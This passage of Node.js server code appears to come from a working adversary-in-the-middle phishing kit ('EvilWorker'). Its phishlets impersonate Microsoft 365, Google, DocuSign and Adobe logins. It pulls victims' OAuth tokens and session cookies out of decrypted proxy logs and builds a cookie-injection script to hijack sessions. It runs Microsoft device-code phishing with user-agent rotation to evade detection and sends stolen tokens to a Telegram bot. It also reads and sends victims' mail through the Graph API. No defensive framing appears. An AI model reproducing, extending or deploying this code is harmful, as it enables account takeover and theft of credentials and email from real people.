            endpoint = `/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        } else if (folderId === 'sent') {
            endpoint = `/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        } else {
            endpoint = `/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        }
        
        const emails = await graph.get(endpoint);
        res.json({ success: true, emails: emails.value || [], count: emails.value?.length || 0 });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/email', async (req, res) => {
    const { accessToken, messageId } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!messageId) return res.status(400).json({ error: 'Message ID required' });

    try {
        let GraphClient;
        try {
            GraphClient = require('./graph_api.js');
        } catch (e) {
            return res.status(500).json({ error: 'graph_api.js not found' });
        }
        const graph = new GraphClient(accessToken);
        const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
        res.json({ success: true, email });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/send', async (req, res) => {
    const { accessToken, to, subject, body, replyToId, forwardFromId } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!to || !subject || !body) return res.status(400).json({ error: 'To, subject, and body required' });

    try {
        let GraphClient;
        try {
            GraphClient = require('./graph_api.js');
        } catch (e) {
            return res.status(500).json({ error: 'graph_api.js not found' });
        }
        const graph = new GraphClient(accessToken);
        
        const emailData = {
            message: {
                subject: subject,
                body: { content: body, contentType: 'HTML' },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            }
        };

        if (replyToId) {
            emailData.message.conversationId = replyToId;
        }

        if (forwardFromId) {
            emailData.message.forwardFrom = { id: forwardFromId };
        }

        const result = await graph.post('/me/sendMail', emailData);
        res.json({ success: true, result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/search', async (req, res) => {
    const { accessToken, query, folderId = 'inbox', limit = 50 } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!query) return res.status(400).json({ error: 'Search query required' });

    try {
        let GraphClient;
        try {
            GraphClient = require('./graph_api.js');
        } catch (e) {
            return res.status(500).json({ error: 'graph_api.js not found' });
        }
        const graph = new GraphClient(accessToken);
        const searchUrl = folderId === 'inbox' 
            ? `/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
            : `/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
        const results = await graph.get(searchUrl);
        res.json({ success: true, emails: results.value || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ PHISHLETS ENDPOINTS ──
dashApp.get('/api/phishlets', (req, res) => {
    try {
        const phishletsPath = path.join(__dirname, 'phishlets.json');
        if (!fs.existsSync(phishletsPath)) {
            const defaultPhishlets = {
                "microsoft": {
                    "name": "Microsoft Office 365",
                    "icon": "microsoft",
                    "file": "index_smQGUDpTF7PN.html",
                    "entryPoint": "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true",
                    "enabled": true
                },
                "google": {
                    "name": "Google Workspace",
                    "icon": "google",
                    "file": "google_login.html",
                    "entryPoint": "/google/login?redirect_uri=https://accounts.google.com/",
                    "enabled": false
                },
                "docusign": {
                    "name": "DocuSign",
                    "icon": "docusign",
                    "file": "docusign_login.html",
                    "entryPoint": "/docusign/login?redirect_uri=https://account.docusign.com/",
                    "enabled": false
                },
                "adobe": {
                    "name": "Adobe Acrobat",
                    "icon": "adobe",
                    "file": "adobe_login.html",
                    "entryPoint": "/adobe/login?redirect_uri=https://account.adobe.com/",
                    "enabled": false
                }
            };
            fs.writeFileSync(phishletsPath, JSON.stringify(defaultPhishlets, null, 2));
            return res.json({ success: true, phishlets: defaultPhishlets });
        }
        
        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
        res.json({ success: true, phishlets });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/phishlets/toggle', (req, res) => {
    const { id, enabled } = req.body;
    try {
        const phishletsPath = path.join(__dirname, 'phishlets.json');
        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
        if (phishlets[id]) {
            phishlets[id].enabled = enabled;
            fs.writeFileSync(phishletsPath, JSON.stringify(phishlets, null, 2));
            res.json({ success: true });
        } else {
            res.status(404).json({ error: 'Phishlet not found' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ VISITS ENDPOINTS ──
dashApp.get('/api/visits', (req, res) => {
    try {
        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
        if (!fs.existsSync(VISITS_LOG_FILE)) {
            return res.json({ visits: [], total: 0, uniqueIPs: 0, today: 0, week: 0 });
        }
        
        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const visits = lines.map(line => JSON.parse(line));
        visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        
        res.json({
            visits: visits.slice(0, 100),
            total: visits.length,
            uniqueIPs: uniqueIPs,
            today: todayVisits.length,
            week: weekVisits.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/visits/stats', (req, res) => {
    try {
        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
        if (!fs.existsSync(VISITS_LOG_FILE)) {
            return res.json({ total: 0, uniqueIPs: 0, today: 0, week: 0 });
        }
        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const visits = lines.map(line => JSON.parse(line));
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        res.json({
            total: visits.length,
            uniqueIPs: uniqueIPs,
            today: todayVisits.length,
            week: weekVisits.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ ANALYTICS ENDPOINTS ──
dashApp.get('/api/analytics', (req, res) => {
    try {
        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
        let visits = [];
        let captures = [];
        
        if (fs.existsSync(VISITS_LOG_FILE)) {
            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            visits = lines.map(line => JSON.parse(line));
        }
        
        const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        captures = logFiles.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { file: f, modified: stat.mtime, size: stat.size };
        });
        
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
        
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
        
        const todayCaptures = captures.filter(c => c.modified >= today);
        const weekCaptures = captures.filter(c => c.modified >= weekAgo);
        const monthCaptures = captures.filter(c => c.modified >= monthAgo);
        
        const conversionRate = {
            today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
            week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
            month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
            total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
        };
        
        const dailyCaptures = {};
        const dailyVisits = {};
        for (let i = 6; i >= 0; i--) {
            const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
            const key = d.toDateString();
            dailyCaptures[key] = 0;
            dailyVisits[key] = 0;
        }
        
        captures.forEach(c => {
            const key = new Date(c.modified).toDateString();
            if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
        });
        
        visits.forEach(v => {
            const key = new Date(v.timestamp).toDateString();
            if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
        });
        
        const domains = {};
        visits.forEach(v => {
            const url = v.url || '';
            const match = url.match(/https?:\/\/([^\/]+)/);
            if (match) {
                const domain = match[1];
                domains[domain] = (domains[domain] || 0) + 1;
            }
        });
        const topDomains = Object.entries(domains)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([domain, count]) => ({ domain, count }));
        
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        
        res.json({
            success: true,
            analytics: {
                visits: {
                    total: visits.length,
                    today: todayVisits.length,
                    week: weekVisits.length,
                    month: monthVisits.length
                },
                captures: {
                    total: captures.length,
                    today: todayCaptures.length,
                    week: weekCaptures.length,
                    month: monthCaptures.length
                },
                conversionRate,
                uniqueIPs,
                dailyCaptures,
                dailyVisits,
                topDomains,
                captureTimeline: captures.map(c => ({
                    date: c.modified,
                    file: c.file,
                    size: c.size
                }))
            }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ TOKEN REPLAY ENDPOINTS ──
dashApp.get('/api/replay/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });

    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        let allCookies = [];
        let targetDomain = null;
        let accessToken = null;
        let refreshToken = null;

        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                const obj = JSON.parse(decrypted);

                if (!targetDomain && obj.proxyRequestURL) {
                    try {
                        const url = new URL(obj.proxyRequestURL);
                        targetDomain = url.hostname;
                    } catch (e) {}
                }

                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                if (setCookie) {
                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                    for (const cookie of cookieArray) {
                        const [nameValue] = cookie.split(';');
                        if (nameValue) allCookies.push(nameValue.trim());
                    }
                }

                const body = obj.proxyRequestBody;
                if (body) {
                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                    if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
                    if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
                }
            } catch (e) {}
        }

        if (allCookies.length === 0 && !accessToken) {
            return res.status(404).json({ error: 'No cookies or tokens found' });
        }

        const replayScript = `
            (function() {
                const cookies = ${JSON.stringify(allCookies)};
                const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
                const accessToken = ${JSON.stringify(accessToken)};
                const refreshToken = ${JSON.stringify(refreshToken)};
                
                cookies.forEach(c => {
                    document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
                });
                
                let msg = '🍪 ' + cookies.length + ' cookies injected.';
                if (accessToken) {
                    msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
                    localStorage.setItem('evil_token', accessToken);
                }
                if (refreshToken) {
                    msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
                }
                alert(msg);
                window.location.href = 'https://' + targetDomain;
            })();
        `;

        res.json({
            success: true,
            cookieCount: allCookies.length,
            targetDomain: targetDomain || 'login.microsoftonline.com',
            hasAccessToken: !!accessToken,
            hasRefreshToken: !!refreshToken,
            replayScript: replayScript,
            cookieString: allCookies.join('; ')
        });

    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/tokens/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });

    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const tokens = {
            access_tokens: [],
            refresh_tokens: [],
            id_tokens: [],
            cookies: [],
            sessions: []
        };

        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                const obj = JSON.parse(decrypted);

                const body = obj.proxyRequestBody;
                if (body) {
                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                    const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                    if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
                    if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
                    if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));

                    try {
                        const json = typeof body === 'string' ? JSON.parse(body) : body;
                        if (json.access_token) tokens.access_tokens.push(json.access_token);
                        if (json.refresh_token) tokens.refresh_tokens.push(json.refresh_token);
                        if (json.id_token) tokens.id_tokens.push(json.id_token);
                    } catch (e) {}
                }

                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                if (setCookie) {
                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                    for (const cookie of cookieArray) {
                        const [nameValue] = cookie.split(';');
                        if (nameValue) tokens.cookies.push(nameValue.trim());
                    }
                }

                const sessionCookie = obj.proxyRequestHeaders?.cookie;
                if (sessionCookie) {
                    tokens.sessions.push(sessionCookie);
                }
            } catch (e) {}
        }

        res.json({
            success: true,
            filename: req.params.filename,
            tokens: tokens
        });

    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ MAIN APP ──
const app = express();

// ── ✅ CRITICAL: JSON MIDDLEWARE ──
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// =====================================================
// 🚨 FIXED DEVICE CODE HANDLERS – USING 'common' TENANT & AUTHENTICATOR CLIENT
// =====================================================

// ── ✅ DEVICE CODE REQUEST (FIXED) ──
app.post('/device/request', async (req, res) => {
    if (!axios) {
        return res.status(500).json({ error: 'axios not installed' });
    }
    try {
        console.log('📱 Device code requested');
        // ✅ Use Authenticator client ID – supports both personal and work accounts
        const clientId = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
        const userAgent = getRandomUserAgent();
        await randomDelay(300, 800);

        const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
        const params = new URLSearchParams({
            client_id: clientId,
            scope: 'https://graph.microsoft.com/.default offline_access'
        });
        console.log(`➡️ Sending request to: ${url}`);
        console.log(`📦 Parameters: ${params.toString()}`);

        const response = await axios.post(url, params, {
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': userAgent
            },
            timeout: 10000
        });
        const data = response.data;
        console.log('✅ Device code obtained:', data.user_code);

        // Store flow
        const newFlow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            approved: null,
            username: null,
            access_token: null,
            refresh_token: null,
            id_token: null,
            manual_submitted: false,
            client_id: clientId,
            user_agent: userAgent,
            session_id: crypto.randomBytes(16).toString('hex'),
            token_type: 'Pending'
        };
        deviceFlows.push(newFlow);
        saveDeviceFlows(deviceFlows);

        // Telegram notification
        const message = `
📱 **Device Code Phishing**
🆔 **User Code:** \`${data.user_code}\`
🔗 **Verification URI:** ${data.verification_uri}
⏱️ **Expires in:** ${data.expires_in} seconds
📱 **Client:** ${clientId}
**Code:** \`${data.user_code}\`
        `;
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }, { timeout: 3000 });
        } catch (e) { console.log('⚠️ Telegram notify failed but continuing'); }

        res.json(data);
    } catch (error) {
        console.error('❌ Device code error:', error.response?.data || error.message);
        res.status(500).json(error.response?.data || { error: error.message });
    }
});

// ── ✅ DEVICE TOKEN POLLING (FIXED) ──
app.post('/device/token', async (req, res) => {
    if (!axios) {
        return res.status(500).json({ error: 'axios not installed' });
    }
    const { device_code } = req.body;
    if (!device_code) {
        return res.status(400).json({ error: 'device_code required' });
    }
    try {
        console.log('🔄 Polling for token:', device_code);
        const flow = deviceFlows.find(f => f.device_code === device_code);
        const clientId = flow?.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
        const userAgent = getRandomUserAgent();
        await randomDelay(200, 600);

        const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
        const params = new URLSearchParams({
            client_id: clientId,
            device_code: device_code,
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
        });
        console.log(`➡️ Polling URL: ${url}`);
        console.log(`📦 Params: ${params.toString()}`);

        const response = await axios.post(url, params, {
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': userAgent
            },
            timeout: 10000
        });
        const tokens = response.data;
        console.log('✅ Tokens obtained!');

        const tokenType = tokens.access_token ? 'Access Token' : 
                         tokens.refresh_token ? 'Refresh Token' : 
                         tokens.id_token ? 'ID Token' : 'Unknown';

        if (flow) {
            flow.status = 'approved';
            flow.approved = new Date().toISOString();
            flow.access_token = tokens.access_token;
            flow.refresh_token = tokens.refresh_token;
            flow.id_token = tokens.id_token;
            flow.token_type = tokenType;
            if (tokens.id_token) {
                try {
                    const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
                    flow.username = payload.email || payload.preferred_username || 'Unknown';
                } catch (e) {}
            }
            saveDeviceFlows(deviceFlows);
        }

        // Telegram success notification
        const message = `
📱 **Device Code Phishing - SUCCESS!**
🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
👤 **User:** ${flow?.username || 'Unknown'}
📱 **Token Type:** ${tokenType}
        `;
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }, { timeout: 3000 });
        } catch (e) {}

        res.json(tokens);
    } catch (error) {
        if (error.response?.data?.error === 'authorization_pending') {
            console.log('⏳ Still waiting for approval...');
            res.status(400).json({ error: 'authorization_pending' });
        } else if (error.response?.data?.error === 'expired_token') {
            console.log('⏰ Code expired');
            const flow = deviceFlows.find(f => f.device_code === device_code);
            if (flow) flow.status = 'expired';
            saveDeviceFlows(deviceFlows);
            res.status(400).json({ error: 'expired_token' });
        } else {
            console.error('❌ Token error:', error.response?.data || error.message);
            res.status(500).json({ error: error.response?.data?.error_description || error.message });
        }
    }
});

// ── ✅ DEVICE PAGE ──
app.get('/device', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'device_code.html');
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Device Login</title>
                <style>
                    body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; background: #f5f5f5; }
                    .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    #codeDisplay { font-size: 52px; font-weight: bold; padding: 30px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; letter-spacing: 6px; font-family: 'Courier New', monospace; }
                    button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; margin: 5px; }
                    button:hover { background: #005a9e; }
                    .status { margin: 20px 0; padding: 12px; border-radius: 5px; }
                    .pending { background: #fff3cd; color: #856404; }
                    .success { background: #d4edda; color: #155724; }
                    .error { background: #f8d7da; color: #721c24; }
                    .info { background: #d1ecf1; color: #0c5460; }
                    .link { color: #0078d4; text-decoration: none; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔐 Device Login</h1>
                    <p>Enter the code on your device to sign in</p>
                    <div id="codeDisplay">Loading...</div>
                    <p><a href="https://login.microsoft.com/device" target="_blank" class="link">https://login.microsoft.com/device</a></p>
                    <div id="status" class="status pending">⏳ Waiting for device approval...</div>
                    <div>
                        <button onclick="generateCode()">🔄 New Code</button>
                        <button onclick="copyCode()">📋 Copy Code</button>
                        <button onclick="checkStatus()">🔄 Check Status</button>
                    </div>
                </div>
                <script>
                    let currentCode = '';
                    let currentDeviceCode = '';
                    
                    async function generateCode() {
                        try {
                            const response = await fetch('/device/request', { method: 'POST' });
                            const data = await response.json();
                            if (data.user_code) {
                                currentCode = data.user_code;
                                currentDeviceCode = data.device_code;
                                document.getElementById('codeDisplay').textContent = currentCode;
                                document.getElementById('status').className = 'status pending';
                                document.getElementById('status').textContent = '⏳ Waiting for device approval...';
                                pollForToken();
                            } else {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
                            }
                        } catch (e) {
                            document.getElementById('status').className = 'status error';
                            document.getElementById('status').textContent = '❌ Error: ' + e.message;
                        }
                    }
                    
                    async function pollForToken() {
                        if (!currentDeviceCode) return;
                        try {
                            const response = await fetch('/device/token', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ device_code: currentDeviceCode })
                            });
                            const data = await response.json();
                            if (data.error === 'authorization_pending') {
                                document.getElementById('status').className = 'status pending';
                                document.getElementById('status').textContent = '⏳ Still waiting for approval...';
                                setTimeout(pollForToken, 5000);
                            } else if (data.error === 'expired_token') {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '⏰ Code expired. Generate a new one.';
                            } else if (data.access_token) {
                                document.getElementById('status').className = 'status success';
                                document.getElementById('status').textContent = '✅ SUCCESS! Tokens obtained!';
                                alert('✅ Tokens captured!\\nAccess Token: ' + data.access_token.slice(0, 30) + '...');
                            } else {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
                            }
                        } catch (e) {
                            if (!e.message.includes('400')) {
                                document.getElementById('status').className = 'status error';
                                document.getElementById('status').textContent = '❌ Error: ' + e.message;
                            }
                        }
                    }
                    
                    function copyCode() {
                        if (currentCode) {
                            navigator.clipboard.writeText(currentCode).then(() => {
                                alert('✅ Code copied: ' + currentCode);
                            }).catch(() => {
                                const textarea = document.createElement('textarea');
                                textarea.value = currentCode;
                                document.body.appendChild(textarea);
                                textarea.select();
                                document.execCommand('copy');
                                document.body.removeChild(textarea);
                                alert('✅ Code copied: ' + currentCode);
                            });
                        } else {
                            alert('No code to copy. Generate one first.');
                        }
                    }
                    
                    function checkStatus() {
                        if (currentDeviceCode) {
                            pollForToken();
                        } else {
                            alert('No active code. Generate one first.');
                        }
                    }
                    
                    generateCode();
                </script>
            </body>
            </html>
        `);
    }
});

// ── ✅ MOUNT DASHBOARD ──
app.use('/dash', dashApp);

// ── ✅ PROXY ROUTE ──
app.use((req, res) => {
    if (!req.path.startsWith('/dash') && !req.path.startsWith('/device')) {
        proxyServer.emit('request', req, res);
    }
});

// ── ✅ START SERVER ──
const PORT = process.env.PORT || 3000;

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: svrps/evilworker)`);
    console.log(`📱 Device Code: /device`);
    console.log(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
    console.log(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
    console.log(`✅ Using 'common' tenant & Authenticator client (fixed AADSTS50059 & 70002)`);
});

// ── ✅ WEBSOCKET SUPPORT ──
if (WebSocket) {
    const wss = new WebSocket.Server({ server });
    let clients = [];
    wss.on('connection', (ws) => {
        clients.push(ws);
        ws.on('close', () => {
            clients = clients.filter(c => c !== ws);
        });
    });
    try {
        fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
            if (filename && filename.endsWith('.log')) {
                clients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({ type: 'newLog', file: filename }));
                    }
                });
            }
        });
    } catch (err) {
        console.warn('⚠️ File watching not available');
    }
}

// ── ✅ ERROR HANDLING ──
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    console.error(err.stack);
});

process.on('unhandledRejection', (err) => {
    console.error('❌ Unhandled Rejection:', err);
});

console.log('✅ Server startup complete!');
